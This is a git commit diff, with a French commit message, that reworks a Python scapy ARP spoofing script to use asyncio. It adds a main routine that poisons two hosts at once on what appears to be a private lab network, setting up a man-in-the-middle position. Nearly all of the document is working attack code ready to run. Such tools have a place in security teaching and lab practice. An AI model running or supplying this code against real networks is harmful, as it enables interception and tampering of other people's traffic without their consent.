dc62a8cf9fa3bb1b83b8382e443923afb3674ed8
TeoHubert <teohubert00@gmail.com>
2025-11-17 17:26:08 +0100

    Refactor la méthode de spoofing ARP pour utiliser asyncio et permettre un fonctionnement non-bloquant

--- arp_spoofing.py
+++ arp_spoofing.py
@@ -1,5 +1,5 @@
 import scapy.all as scapy
-import time
+import asyncio
 
 class ArpSpoofing:
     def __init__(self, ip_src, ip_dst, mac_src, mac_dst, interface):
@@ -18,11 +18,18 @@ class ArpSpoofing:
         print(packet.summary())
         scapy.sendp(packet, iface=self.interface, verbose=False)
 
-    def start_spoofing(self):
+    async def start_spoofing(self, interval: float = 2.0):
+        """Coroutine non-bloquante : exécute la méthode bloquante self.spoof() dans
+        un executor et utilise asyncio.sleep pour le délai.
+        """
+        loop = asyncio.get_running_loop()
         try:
             while True:
-                self.spoof()
-                time.sleep(2)
+                await loop.run_in_executor(None, self.spoof)
+                await asyncio.sleep(interval)
+        except asyncio.CancelledError:
+            print(f"Spoofing ARP interrompu pour {self.ip_dst}")
+            raise
         except Exception as e:
             print("Arrêt du spoofing ARP de "+self.ip_dst+" - "+str(e))
     
@@ -30,6 +37,29 @@ class ArpSpoofing:
         return f"ArpSpoofing(ip_src={self.ip_src}, mac_src={self.mac_src}, ip_dst={self.ip_dst}, mac_dst={self.mac_dst}, interface={self.interface})"
 
 
-s = ArpSpoofing("192.168.56.5", "192.168.56.4", "d6:61:9d:90:a2:64", "08:00:27:07:78:aa", "bridge100")
-print(s)
-s.start_spoofing()
+def _make_example_instances():
+    # Remplacez ces adresses et MACs par celles adaptées à votre environnement
+    s1 = ArpSpoofing("192.168.56.5", "192.168.56.4", "d6:61:9d:90:a2:64", "08:00:27:07:78:aa", "bridge100")
+    s2 = ArpSpoofing("192.168.56.4", "192.168.56.5", "d6:61:9d:90:a2:64", "08:00:27:74:d6:4d", "bridge100")
+    return s1, s2
+
+
+async def main():
+    s1 = ArpSpoofing("192.168.56.5", "192.168.56.4", "d6:61:9d:90:a2:64", "08:00:27:07:78:aa", "bridge100")
+    s2 = ArpSpoofing("192.168.56.4", "192.168.56.5", "d6:61:9d:90:a2:64", "08:00:27:74:d6:4d", "bridge100")
+
+    # Lancer les deux spoofers en parallèle
+    t1 = asyncio.create_task(s1.start_spoofing(interval=2.0))
+    t2 = asyncio.create_task(s2.start_spoofing(interval=2.0))
+    try:
+        await asyncio.gather(t1, t2)
+    except asyncio.CancelledError:
+        t1.cancel()
+        t2.cancel()
+
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("Arrêt demandé par l'utilisateur")
